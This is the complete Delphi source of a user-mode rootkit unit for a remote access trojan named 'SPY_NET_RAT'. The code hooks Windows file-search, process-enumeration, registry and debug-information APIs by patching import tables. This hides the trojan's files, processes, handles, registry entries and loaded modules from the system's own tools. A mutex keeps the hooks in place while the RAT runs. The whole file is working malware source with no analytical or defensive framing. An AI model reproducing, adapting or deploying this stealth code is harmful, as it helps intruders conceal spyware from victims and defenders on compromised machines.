unit UnitRootKIT;
{$IMAGEBASE $21764538}
interface

uses
  windows,
  JwaWinSvc,
  JwaWinType,
  Native,
  ShellApi,
  tlHelp32;

const
  SPY_NET = 'SPY_NET_RAT';
  MutexName = SPY_NET + 'MUTEX';

procedure StartRootKIT;

implementation

type
  TModuleList = array of cardinal;
  TImportFunction = packed record
    JumpInstruction: Word;
    AddressOfPointerToFunction: ^Pointer;
  end;
  TImageImportEntry = record
    Characteristics: dword;
    TimeDateStamp: dword;
    MajorVersion: word;
    MinorVersion: word;
    Name: dword;
    LookupTable: dword;
  end;

function GetModuleList: TModuleList;  stdcall;
var
  Module, Base: pointer;
  ModuleCount: integer;
  lpModuleName: array [0..MAX_PATH] of char;
  MemoryBasicInformation: TMemoryBasicInformation;
begin
  SetLength(Result, 10);
  ModuleCount := 0;
  Module := nil;
  Base := nil;
  while VirtualQueryEx(GetCurrentProcess, Module, MemoryBasicInformation, SizeOf(MemoryBasicInformation)) = SizeOf(MemoryBasicInformation) do
  begin
    if (MemoryBasicInformation.State = MEM_COMMIT) and (MemoryBasicInformation.AllocationBase <> Base) and (MemoryBasicInformation.AllocationBase = MemoryBasicInformation.BaseAddress) and (GetModuleFileName(dword(MemoryBasicInformation.AllocationBase), lpModuleName, MAX_PATH) > 0) then
    begin
      if ModuleCount = Length(Result) then SetLength(Result, ModuleCount * 2);
      Result[ModuleCount] := dword(MemoryBasicInformation.AllocationBase);
      Inc(ModuleCount);
    end;
    Base := MemoryBasicInformation.AllocationBase;
    dword(Module) := dword(Module) + MemoryBasicInformation.RegionSize;
  end;
  SetLength(Result, ModuleCount);
end;

function FunctionAddress(Code: Pointer): Pointer;stdcall;
begin
  Result := Code;
  if TImportFunction(Code^).JumpInstruction = $25FF then Result := TImportFunction(Code^).AddressOfPointerToFunction^;
end;

function HookModules(ImageDosHeader: PImageDosHeader; TargetAddress, NewAddress: Pointer; var OldAddress: Pointer):integer;stdcall;
var
  ImageNTHeaders : PImageNtHeaders;
  ImageImportEntry: ^TImageImportEntry;
  ImportCode: ^Pointer;
  OldProtect: dword;
  EndofImports: dword;
begin
  Result := 0;
  OldAddress := FunctionAddress(TargetAddress);
  if ImageDosHeader.e_magic <> IMAGE_DOS_SIGNATURE then Exit;
  ImageNTHeaders := Pointer(integer(ImageDosHeader) + ImageDosHeader._lfanew);;
  if ImageNTHeaders <> nil then
  begin
    with ImageNTHeaders^.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT] do
    begin
      ImageImportEntry := Pointer(dword(ImageDosHeader) + VirtualAddress);
      EndofImports := VirtualAddress + Size;
    end;
    if ImageImportEntry <> nil then
    begin
      while ImageImportEntry^.Name <> 0 do
      begin
        if ImageImportEntry^.LookUpTable > EndofImports then break;
        if ImageImportEntry^.LookUpTable <> 0 then
        begin
          ImportCode := Pointer(dword(ImageDosHeader) + ImageImportEntry^.LookUpTable);
          while ImportCode^ <> nil do
          begin
            if (ImportCode^ = TargetAddress) and VirtualProtect(ImportCode, 4, PAGE_EXECUTE_READWRITE, @OldProtect) then ImportCode^ := NewAddress;
            Inc(ImportCode);
          end;
        end;
        Inc(ImageImportEntry);
      end;
    end;
  end;
end;

function HookAPI(TargetModule, TargetProc:Pchar; NewProc: Pointer; var OldProc: Pointer): integer;  stdcall;
var
  ModuleLoop: integer;
  Modules: TModuleList;
  Module: hModule;
  Target: pointer;
begin
  Result := 0;
  Module := GetModuleHandle(pchar(TargetModule));
  Modules := GetModuleList;
  if Module = 0 then
  begin
    Module := LoadLibrary(pchar(TargetModule));
  end;
  Target := GetProcAddress(Module, pchar(TargetProc));
  if Target = nil then Exit;
  for ModuleLoop := 0 to High(Modules) do
  begin
    if (GetVersion and $80000000 = 0) or (Modules[ModuleLoop] < $80000000) then
    begin
      Result := HookModules(Pointer(Modules[ModuleLoop]), Target, NewProc, OldProc);
    end;
  end;
end;

function UnHookAPI(NewProc, OldProc: Pointer): integer; stdcall;
var
  ModuleLoop: integer;
  Modules: TModuleList;
begin
  Result := 0;
  Modules := GetModuleList;
  for ModuleLoop := 0 to High(Modules) do
  begin
    if (GetVersion and $80000000 = 0) or (Modules[ModuleLoop] < $80000000) then
    begin
      Result := HookModules(Pointer(Modules[ModuleLoop]), NewProc, OldProc, NewProc);
    end;
  end;
end;

function LowerCase(const S: string): string;
var
  Ch: Char;
  L: Integer;
  Source, Dest: PChar;
begin
  L := Length(S);
  SetLength(Result, L);
  Source := Pointer(S);
  Dest := Pointer(Result);
  while L <> 0 do
  begin
    Ch := Source^;
    if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
    Dest^ := Ch;
    Inc(Source);
    Inc(Dest);
    Dec(L);
  end;
end;

function StrCmp(String1, String2: string): boolean;
begin
  if (lstrcmpi(pchar(String1), pchar(String2)) = 0) or
     (pos(lowercase(String1), lowercase(String2)) > 0) then
  begin
    Result := True;
  end
  else
  begin
    Result := False;
  end;
end;

//////////////
var
  FindNextFileWNext : function (handle: dword; var data: TWin32FindDataW) : bool; stdcall;
  FindNextFileANext : function (handle: dword; var data: TWin32FindDataA) : bool; stdcall;
  FindFirstFileWNext :function (lpFileName: PWChar; var data: TWIN32FindDataW): dword; stdcall;
  FindFirstFileANext :function (lpFileName: PChar; var data: TWIN32FindDataA): dword; stdcall;

  NtQuerySystemInformationNextHook: function(SystemInformationClass: SYSTEM_INFORMATION_CLASS; SystemInformation: PVOID; SystemInformationLength: ULONG; ReturnLength: PULONG): NTSTATUS; stdcall;
  NtEnumerateValueKeyNextHook: function(KeyHandle: HANDLE; Index: ULONG; KeyValueInformationClass: KEY_VALUE_INFORMATION_CLASS; KeyValueInformation: PVOID; KeyValueInformationLength: ULONG; ResultLength: PULONG): NTSTATUS; stdcall;
  NtEnumerateKeyNextHook: function(KeyHandle: HANDLE; Index: ULONG; KeyInformationClass: KEY_INFORMATION_CLASS; KeyInformation: PVOID; KeyInformationLength: ULONG; ResultLength: PULONG): NTSTATUS; stdcall;
  //algumas falhas aqui
  //NtQueryDirectoryFileNextHook: function(FileHandle: HANDLE; Event: HANDLE; ApcRoutine: PIO_APC_ROUTINE; ApcContext: PVOID; IoStatusBlock: PIO_STATUS_BLOCK; FileInformation: PVOID; FileInformationLength: ULONG; FileInformationClass: FILE_INFORMATION_CLASS; ReturnSingleEntry: ByteBool; FileName: PUNICODE_STRING; RestartScan: ByteBool): NTSTATUS; stdcall;
  RtlQueryProcessDebugInformationNextHook: function(hProcess: THandle; lpParam: dword; lpBuffer: pointer): dword; stdcall;

  RegQueryValueExNextHook: function(hKey: HKEY; lpValueName: PChar; lpReserved: Pointer; lpType: PDWORD; lpData: PByte; lpcbData: PDWORD): Longint; stdcall;
  RegQueryValueExWNextHook: function(hKey: HKEY; lpValueName: PWideChar; lpReserved: Pointer; lpType: PDWORD; lpData: PByte; lpcbData: PDWORD): Longint; stdcall;

function RegQueryValueExHookProc(hKey: HKEY; lpValueName: PChar; lpReserved: Pointer; lpType: PDWORD; lpData: PByte; lpcbData: PDWORD): Longint; stdcall;
begin
  if (StrCmp(SPY_NET, lpValueName) = true) then
  begin
    regclosekey(hkey);
    result := ERROR_SUCCESS;
  end else
  result := RegQueryValueExNextHook(hKey, lpValueName, lpReserved, lpType, lpData, lpcbData);
end;

function RegQueryValueExWHookProc(hKey: HKEY; lpValueName: PWideChar; lpReserved: Pointer; lpType: PDWORD; lpData: PByte; lpcbData: PDWORD): Longint; stdcall;
begin
  if (StrCmp(SPY_NET, lpValueName) = true) then
  begin
    regclosekey(hkey);
    result := ERROR_SUCCESS;
  end else
  result := RegQueryValueExWNextHook(hKey, lpValueName, lpReserved, lpType, lpData, lpcbData);
end;

type
  PDebugModule = ^TDebugModule;
  TDebugModule = packed record
    Reserved: array [0..1] of Cardinal; 
    Base: Cardinal; 
    Size: Cardinal;
    Flags: Cardinal;
    Index: Word; 
    Unknown: Word;
    LoadCount: Word;
    ModuleNameOffset: Word; 
    ImageName: array [0..$FF] of Char;
  end;

  PDebugModuleInformation = ^TDebugModuleInformation;
  TDebugModuleInformation = record
    Count: Cardinal;
    Modules: array [0..0] of TDebugModule; 
  end; 
  PDebugBuffer = ^TDebugBuffer;
  TDebugBuffer = record 
    SectionHandle: THandle; 
    SectionBase: Pointer;
    RemoteSectionBase: Pointer; 
    SectionBaseDelta: Cardinal; 
    EventPairHandle: THandle; 
    Unknown: array [0..1] of Cardinal;
    RemoteThreadHandle: THandle; 
    InfoClassMask: Cardinal; 
    SizeOfInfo: Cardinal; 
    AllocatedSize: Cardinal; 
    SectionSize: Cardinal; 
    ModuleInformation: PDebugModuleInformation;
    BackTraceInformation: Pointer; 
    HeapInformation: Pointer;
    LockInformation: Pointer; 
    Reserved: array [0..7] of Pointer;
  end;

function RtlQueryProcessDebugInformationHookProc(hProcess: THandle; lpParam: dword; lpBuffer: pointer): dword; stdcall;
var
  QDB: PDebugBuffer;
  DllLoop: word;
begin
  Result := RtlQueryProcessDebugInformationNextHook(hProcess, lpParam, lpBuffer);
  if Result <> 0 then Exit;
  if lpBuffer = nil then Exit;
  QDB := PDebugBuffer(lpBuffer);
  DllLoop := 0;
  if IsBadReadPtr(@QDB.ModuleInformation.Count, SizeOf(PDebugModule)) then Exit;
  if QDB.ModuleInformation.Count = 0 then Exit;
  while DllLoop < QDB.ModuleInformation.Count do
  begin
    if Pos(LowerCase(SPY_NET), string(QDB.ModuleInformation.Modules[DllLoop].ImageName)) <> 0 then
    begin
      CopyMemory(@QDB.ModuleInformation.Modules[DllLoop], @QDB.ModuleInformation.Modules[DllLoop + 1], SizeOf(QDB.ModuleInformation.Modules[DllLoop]));
      QDB.ModuleInformation.Count := QDB.ModuleInformation.Count - 1;
    end
    else
    begin
      Inc(DllLoop);
    end;
  end;
end;
{
function NtQueryDirectoryFileHookProc(FileHandle: HANDLE; Event: HANDLE; ApcRoutine: PIO_APC_ROUTINE; ApcContext: PVOID; IoStatusBlock: PIO_STATUS_BLOCK; FileInformation: PVOID; FileInformationLength: ULONG; FileInformationClass: FILE_INFORMATION_CLASS; ReturnSingleEntry: ByteBool; FileName: PUNICODE_STRING; RestartScan: ByteBool): NTSTATUS; stdcall;
var
  Offset: dword;
  Name: string;
  LastFileDirectoryInfo, FileDirectoryInfo: PFILE_DIRECTORY_INFORMATION;
  LastFileFullDirectoryInfo, FileFullDirectoryInfo: PFILE_FULL_DIRECTORY_INFORMATION;
  LastFileBothDirectoryInfo, FileBothDirectoryInfo: PFILE_BOTH_DIRECTORY_INFORMATION;
  LastFileNamesInfo, FileNamesInfo: PFILE_NAMES_INFORMATION;
begin
  Result := NtQueryDirectoryFileNextHook(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, FileInformationLength, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
  if Result <> 0 then Exit;
  Offset := 0;
  case dword(FileInformationClass) of
    1:
      begin
        FileDirectoryInfo := nil;
        repeat
          LastFileDirectoryInfo := FileDirectoryInfo;
          FileDirectoryInfo := PFILE_DIRECTORY_INFORMATION(pointer(dword(FileInformation) + Offset));
          Name := Copy(WideCharToString(FileDirectoryInfo.FileName), 1, FileDirectoryInfo.FileNameLength div 2);
          if StrCmp(Name, SPY_NET) then
          begin
            if FileDirectoryInfo.NextEntryOffset = 0 then
            begin
              if LastFileDirectoryInfo <> nil then LastFileDirectoryInfo.NextEntryOffset := 0
              else Result := NTSTATUS($C000000F);
              Exit;
            end
            else
            begin
              LastFileDirectoryInfo.NextEntryOffset := LastFileDirectoryInfo.NextEntryOffset + FileDirectoryInfo.NextEntryOffset;
            end;
          end;
          Offset := Offset + FileDirectoryInfo.NextEntryOffset;
        until FileDirectoryInfo.NextEntryOffset = 0;
      end;
    2:
      begin
        FileFullDirectoryInfo := nil;
        repeat
          LastFileFullDirectoryInfo := FileFullDirectoryInfo;
          FileFullDirectoryInfo := PFILE_FULL_DIRECTORY_INFORMATION(pointer(dword(FileInformation) + Offset));
          Name := Copy(WideCharToString(FileFullDirectoryInfo.FileName), 1, FileFullDirectoryInfo.FileNameLength div 2);
          if StrCmp(Name, SPY_NET) then
          begin
            if FileFullDirectoryInfo.NextEntryOffset = 0 then
            begin
              if LastFileFullDirectoryInfo <> nil then LastFileFullDirectoryInfo.NextEntryOffset := 0
              else Result := NTSTATUS($C000000F);
              Exit;
            end
            else
            begin
              LastFileFullDirectoryInfo.NextEntryOffset := LastFileFullDirectoryInfo.NextEntryOffset + FileFullDirectoryInfo.NextEntryOffset;
            end;
          end;
          Offset := Offset + FileFullDirectoryInfo.NextEntryOffset;
        until FileFullDirectoryInfo.NextEntryOffset = 0;
      end;
    3:
      begin
        FileBothDirectoryInfo := nil;
        repeat
          LastFileBothDirectoryInfo := FileBothDirectoryInfo;
          FileBothDirectoryInfo := PFILE_BOTH_DIRECTORY_INFORMATION(pointer(dword(FileInformation) + Offset));
          Name := Copy(WideCharToString(FileBothDirectoryInfo.FileName), 1, FileBothDirectoryInfo.FileNameLength div 2);
          if StrCmp(Name, SPY_NET) then
          begin
            if FileBothDirectoryInfo.NextEntryOffset = 0 then
            begin
              if LastFileBothDirectoryInfo <> nil then LastFileBothDirectoryInfo.NextEntryOffset := 0
              else Result := NTSTATUS($C000000F);
              Exit;
            end
            else
            begin
              LastFileBothDirectoryInfo.NextEntryOffset := LastFileBothDirectoryInfo.NextEntryOffset + FileBothDirectoryInfo.NextEntryOffset;
            end;
          end;
          Offset := Offset + FileBothDirectoryInfo.NextEntryOffset;
        until FileBothDirectoryInfo.NextEntryOffset = 0;
      end;
    12:
      begin
        FileNamesInfo := nil;
        repeat
          LastFileNamesInfo := FileNamesInfo;
          FileNamesInfo := PFILE_NAMES_INFORMATION(pointer(dword(FileInformation) + Offset));
          Name := Copy(WideCharToString(FileNamesInfo.FileName), 1, FileNamesInfo.FileNameLength div 2);
          if StrCmp(Name, SPY_NET) then
          begin
            if FileNamesInfo.NextEntryOffset = 0 then
            begin
              if LastFileNamesInfo <> nil then LastFileNamesInfo.NextEntryOffset := 0
              else Result := NTSTATUS($C000000F);
              Exit;
            end
            else
            begin
              LastFileNamesInfo.NextEntryOffset := LastFileNamesInfo.NextEntryOffset + FileNamesInfo.NextEntryOffset;
            end;
          end;
          Offset := Offset + FileNamesInfo.NextEntryOffset;
        until FileNamesInfo.NextEntryOffset = 0;
      end;
  end;
end;
}
function GetKeyShift(KeyHandle: dword; Index: ULONG): dword;
var
  KeyInformation: KEY_BASIC_INFORMATION;
  ResultLength: ULONG;
  ValueLoop: dword;
begin
  Result := 0;
  ValueLoop := 0;
  while ValueLoop <= Index do
  begin
    ZeroMemory(@KeyInformation, SizeOf(KEY_BASIC_INFORMATION));
    if NtEnumerateKeyNextHook(KeyHandle, Result, KeyBasicInformation, @KeyInformation, SizeOf(KEY_BASIC_INFORMATION), @ResultLength) <> ERROR_SUCCESS then Break;
    byte(pointer(dword(@KeyInformation) + ResultLength)^) := 0;
    if not StrCmp(SPY_NET, WideCharToString(PWideChar(@KeyInformation.Name))) then
    begin
      Inc(ValueLoop);
    end;
    if ValueLoop > Index then Exit;
    Inc(Result);
  end;
end;

function NtEnumerateKeyHookProc(KeyHandle: HANDLE; Index: ULONG; KeyInformationClass: KEY_INFORMATION_CLASS; KeyInformation: PVOID; KeyInformationLength: ULONG; ResultLength: PULONG): NTSTATUS; stdcall;
begin
  Result := NtEnumerateKeyNextHook(KeyHandle, GetKeyShift(KeyHandle, Index), KeyInformationClass, KeyInformation, KeyInformationLength, ResultLength);
end;

function ExtractFilePath(FileName: string): string;
begin
  Result := '';
  while ((Pos('\', FileName) <> 0) or (Pos('/', FileName) <> 0)) do
  begin
    Result := Result + Copy(FileName, 1, 1);
    Delete(FileName, 1, 1);
  end;
end;


function GetPathFromId(Id: dword): string;
type
  TProcessBasicInformation = record
    ExitStatus: Integer;
    PebBaseAddress: Pointer;
    AffinityMask: Integer;
    BasePriority: Integer;
    UniqueProcessID: Integer;
    InheritedFromUniqueProcessID: Integer;
  end;
var
  Process: dword;
  ProcInfo: TProcessBasicInformation;
  BytesRead: dword;
  Usr, Buf: dword;
  Len: word;
  Buffer: PWideChar;
begin
  Result := '';
  Process := OpenProcess(PROCESS_VM_READ or PROCESS_QUERY_INFORMATION, False, Id);
  NtQueryInformationProcess(Process, ProcessBasicInformation, @ProcInfo, SizeOf(TProcessBasicInformation), nil);
  ReadProcessMemory(Process, pointer(dword(ProcInfo.PebBaseAddress) + $10), @Usr, 4, BytesRead);
  ReadProcessMemory(Process, pointer(Usr + $38), @Len, 2, BytesRead);
  GetMem(Buffer, Len);
  try
    ReadProcessMemory(Process, pointer(Usr + $3c), @Buf, 4, BytesRead);
    ReadProcessMemory(Process, pointer(Buf), Buffer, Len, BytesRead);
    Result := WideCharToString(Buffer);
  finally
    FreeMem(Buffer);
  end;
  SetLength(Result, Len div 2);
end;

Function lerreg(Key:HKEY; Path:string; Value, Default: string): string;
Var
  Handle:hkey;
  RegType:integer;
  DataSize:integer;

begin
  Result := Default;
  if (RegOpenKeyEx(Key, pchar(Path), 0, KEY_QUERY_VALUE, Handle) = ERROR_SUCCESS) then
  begin
    if RegQueryValueEx(Handle, pchar(Value), nil, @RegType, nil, @DataSize) = ERROR_SUCCESS then
    begin
      SetLength(Result, Datasize);
      RegQueryValueEx(Handle, pchar(Value), nil, @RegType, PByte(pchar(Result)), @DataSize);
      SetLength(Result, Datasize - 1);
    end;
    RegCloseKey(Handle);
  end;
end;

function IntToStr(i: Int64): String;
begin
  Str(i, Result);
end;

function StrToInt(S: String): Int64;
var
  E: integer;
begin
  Val(S, Result, E);
end;

function IsId(Id: dword): boolean;
var
  Path: string;
  PID: integer;
begin
  try
    PID := strtoint(lerreg(HKEY_CURRENT_USER, 'SOFTWARE\Microsoft\', 'PIDprocess', ''));
    except
    PID := 0;
  end;
  Path := LowerCase(GetPathFromId(Id));
  Result := (Pos(LowerCase(SPY_NET), Path) <> 0) or (Id = PID);
end;

function GetValueShift(KeyHandle: dword; Index: ULONG): dword;
var
  KeyValueInformation: KEY_VALUE_BASIC_INFORMATION;
  ResultLength: ULONG;
  ValueLoop: dword;
  RootPath: string;
begin
  Result := 0;
  RootPath := SPY_NET;
  ValueLoop := 0;
  while ValueLoop <= Index do
  begin
    ZeroMemory(@KeyValueInformation, SizeOf(KEY_VALUE_BASIC_INFORMATION));
    if NtEnumerateValueKeyNextHook(KeyHandle, Result, KeyValueBasicInformation, @KeyValueInformation, SizeOf(KEY_VALUE_BASIC_INFORMATION), @ResultLength) <> ERROR_SUCCESS then Break;
    byte(pointer(dword(@KeyValueInformation) + ResultLength)^) := 0;
    if not StrCmp(RootPath, ExtractFilePath(WideCharToString(PWideChar(@KeyValueInformation.Name)))) then
    begin
      Inc(ValueLoop);
    end;
    if ValueLoop > Index then Exit;
    Inc(Result);
  end;
end;

function NtEnumerateValueKeyHookProc(KeyHandle: HANDLE; Index: ULONG; KeyValueInformationClass: KEY_VALUE_INFORMATION_CLASS; KeyValueInformation: PVOID; KeyValueInformationLength: ULONG; ResultLength: PULONG): NTSTATUS; stdcall;
begin
  Result := NtEnumerateValueKeyNextHook(KeyHandle, GetValueShift(KeyHandle, Index), KeyValueInformationClass, KeyValueInformation, KeyValueInformationLength, ResultLength);
end;

function NtQuerySystemInformationHookProc(SystemInformationClass: SYSTEM_INFORMATION_CLASS; SystemInformation: PVOID; SystemInformationLength: ULONG; ReturnLength: PULONG): NTSTATUS; stdcall;
var
  LastProcessInfo, ProcessInfo: PSYSTEM_PROCESSES;
  HandleEntry: SYSTEM_HANDLE_TABLE_ENTRY_INFO;
  HandleInfo: PSYSTEM_HANDLE_INFORMATION;
  HandlesParsed, Offset: dword;
begin
  Result := NtQuerySystemInformationNextHook(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
  if Result <> 0 then Exit;
  if SystemInformationClass = SystemProcessesAndThreadsInformation then
  begin
    Offset := 0;
    LastProcessInfo := nil;
    repeat
      ProcessInfo := PSYSTEM_PROCESSES(pointer(dword(SystemInformation) + Offset));
      if IsId(ProcessInfo.ProcessId) then
      begin
        if ProcessInfo.NextEntryDelta = 0 then
        begin
          if LastProcessInfo <> nil then LastProcessInfo.NextEntryDelta := 0;
          Exit;
        end
        else
        begin
          LastProcessInfo.NextEntryDelta := LastProcessInfo.NextEntryDelta + ProcessInfo.NextEntryDelta;
        end;
      end
      else
      begin
        LastProcessInfo := ProcessInfo;
      end;
      Offset := Offset + ProcessInfo.NextEntryDelta;
    until ProcessInfo.NextEntryDelta = 0;
  end
  else if SystemInformationClass = SystemHandleInformation then
  begin
    HandleInfo := PSYSTEM_HANDLE_INFORMATION(SystemInformation);
    HandlesParsed := 0;
    while HandlesParsed < HandleInfo.NumberOfHandles do
    begin
      HandleEntry := HandleInfo.Handles[HandlesParsed];
      if IsId(HandleEntry.UniqueProcessId) then
      begin
        ZeroMemory(@HandleInfo.Handles[HandlesParsed], SizeOf(SYSTEM_HANDLE_INFORMATION));
      end;
      Inc(HandlesParsed);
    end;
  end;
end;

function FindFirstFileACallback(lpFileName: PChar; var data: TWIN32FindDataA): dword; stdcall;
var
  tmp: bool;
begin
  result := FindFirstFileANext(lpFileName, data);
  if StrCmp(SPY_NET, data.cFileName) then
  repeat
    tmp:= FindNextFileANext(result, data);
  until (not tmp) or (not StrCmp(SPY_NET, data.cFileName));
end;

function FindFirstFileWCallback(lpFileName: PWChar; var data: TWIN32FindDataW): dword; stdcall;
var
  tmp: bool;
begin
  result := FindFirstFileWNext(lpFileName, data);
  if StrCmp(SPY_NET, data.cFileName) then
  repeat
    tmp := FindNextFileWNext(result, data);
  until (not tmp) or (not StrCmp(SPY_NET, data.cFileName));
end;

function FindNextFileACallback(handle: dword; var data: TWin32FindDataA) : bool; stdcall;
begin
  repeat
    result := FindNextFileANext(handle, data);
  until (not result) or (not StrCmp(SPY_NET, data.cFileName));
end;
function FindNextFileWCallback(handle: dword; var data: TWin32FindDataW) : bool; stdcall;
begin
  repeat
    result := FindNextFileWNext(handle, data);
  until (not result) or (not StrCmp(SPY_NET, data.cFileName));
end;

procedure Hook; stdcall;
begin
  HookAPI('kernel32.dll', 'FindNextFileA', @FindNextFileACallback, @FindNextFileANext);
  HookAPI('kernel32.dll', 'FindNextFileW', @FindNextFileWCallback, @FindNextFileWNext);
  HookAPI('kernel32.dll', 'FindFirstFileA', @FindFirstFileACallback, @FindFirstFileANext);
  HookAPI('kernel32.dll', 'FindFirstFileW', @FindFirstFileWCallback, @FindFirstFileWNext);

  HookAPI('Ntdll.dll', 'NtQuerySystemInformation', @NtQuerySystemInformationHookProc, @NtQuerySystemInformationNextHook);
  //algumas falhas aqui
  //HookAPI('Ntdll.dll', 'NtQueryDirectoryFile', @NtQueryDirectoryFileHookProc, @NtQueryDirectoryFileNextHook);
  HookAPI('Ntdll.dll', 'RtlQueryProcessDebugInformation', @RtlQueryProcessDebugInformationHookProc, @RtlQueryProcessDebugInformationNextHook);
  HookAPI('Ntdll.dll', 'NtEnumerateValueKey', @NtEnumerateValueKeyHookProc, @NtEnumerateValueKeyNextHook);
  HookAPI('Ntdll.dll', 'NtEnumerateKey', @NtEnumerateKeyHookProc, @NtEnumerateKeyNextHook);

  HookAPI('advapi32.dll', 'RegQueryValueExA', @RegQueryValueExHookProc, @RegQueryValueExNextHook);
  HookAPI('advapi32.dll', 'RegQueryValueExW', @RegQueryValueExWHookProc, @RegQueryValueExWNextHook);
end;

procedure UnHook; stdcall;
begin
  UnHookAPI(@FindNextFileACallback, @FindNextFileANext);
  UnHookAPI(@FindNextFileWCallback, @FindNextFileWNext);
  UnHookAPI(@FindFirstFileACallback, @FindFirstFileANext);
  UnHookAPI(@FindFirstFileWCallback, @FindFirstFileWNext);

  UnHookAPI(@NtQuerySystemInformationHookProc, @NtQuerySystemInformationNextHook);
  //algumas falhas aqui
  //UnHookAPI(@NtQueryDirectoryFileHookProc, @NtQueryDirectoryFileNextHook);
  UnHookAPI(@RtlQueryProcessDebugInformationHookProc, @RtlQueryProcessDebugInformationNextHook);
  UnHookAPI(@NtEnumerateValueKeyHookProc, @NtEnumerateValueKeyNextHook);
  UnHookAPI(@NtEnumerateKeyHookProc, @NtEnumerateKeyNextHook);

  UnHookAPI(@RegQueryValueExHookProc, @RegQueryValueExNextHook);
  UnHookAPI(@RegQueryValueExWHookProc, @RegQueryValueExWNextHook);
end;

procedure StartRootKIT;
var
  TempMutex: thandle;
begin
  Hook;
  while true do
  begin
    randomize;
    sleep(random(100) + random(100));
    TempMutex := CreateMutex(nil, False, pchar(MutexName));
    if GetLastError = ERROR_ALREADY_EXISTS then
    CloseHandle(TempMutex) else
    begin
      CloseHandle(TempMutex);
      UnHook;
      break;
      exit;
    end;
  end;
end;

end.
